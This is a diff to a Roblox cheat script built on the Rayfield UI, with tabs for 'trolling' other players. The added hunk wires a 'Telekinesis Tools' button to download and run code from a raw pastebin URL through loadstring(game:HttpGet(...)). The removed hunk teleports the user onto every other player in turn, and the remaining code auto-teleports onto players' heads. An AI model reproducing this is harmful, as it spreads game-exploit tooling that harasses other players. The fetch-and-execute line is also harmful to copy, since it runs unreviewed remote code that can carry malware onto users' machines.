@@ -937,6 +937,25 @@ local Paragraph = BTab:CreateParagraph({Title = "Recoil Tool For Player / Friend
 
 local Divider = BTab:CreateDivider()
 
+local Label = BTab:CreateLabel(" [ - This Item Telekinesis Tool Is Bypass On In Mapping - ]", "magnet", Color3.fromRGB(138, 43, 179) , false)
+local Button = BTab:CreateButton({
+   Name = "[ 🫳 ]   Telekinesis Tools   [  -  Grabing Items  -  ]",
+   Callback = function()
+
+       Rayfield:Notify({
+            Title =   "[ 🫳 ]  Telekinesis Tools Grab",
+            Content = "[ ✅ ]  Telekinesis Tools Grab Click",
+            Duration = 1,
+            Image = "magnet",
+         })
+
+       loadstring(game:HttpGet("https://pastebin.com/raw/XLQXhDQf"))()
+   end,
+})
+
+local Paragraph = BTab:CreateParagraph({Title = "Telekinesis Tools For Player / Friend", Content = "Telekinesis Tool Is Good For Grabing Items"})
+local Divider = BTab:CreateDivider()
+
 local friendTab = Window:CreateTab("||   - Trolling Player", "bug-play")
 local Divider = friendTab:CreateDivider()
 
@@ -1171,26 +1190,6 @@ friendTab:CreateButton({
     end
 end})
 
-friendTab:CreateButton({
-    Name = "[ 📞 ] Teleport To All Players",
-    Callback = function()
-        local Players = game:GetService("Players")
-        local char = player.Character or player.CharacterAdded:Wait()
-        local hrp = char:WaitForChild("HumanoidRootPart", 5)
-        if not hrp then return end
-        for _, targetPlayer in ipairs(Players:GetPlayers()) do
-            if targetPlayer ~= player and targetPlayer.Character then
-                local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-                if targetHRP then
-                    hrp.CFrame = targetHRP.CFrame + Vector3.new(0, 3, 0)
-                    task.wait(1)
-                end
-            end
-        end
-    end
-})
-
--- Auto Teleport
 friendTab:CreateToggle({
     Name = "[ 🪑 ]  Auto Teleport To Player Sit Head",
     CurrentValue = false,
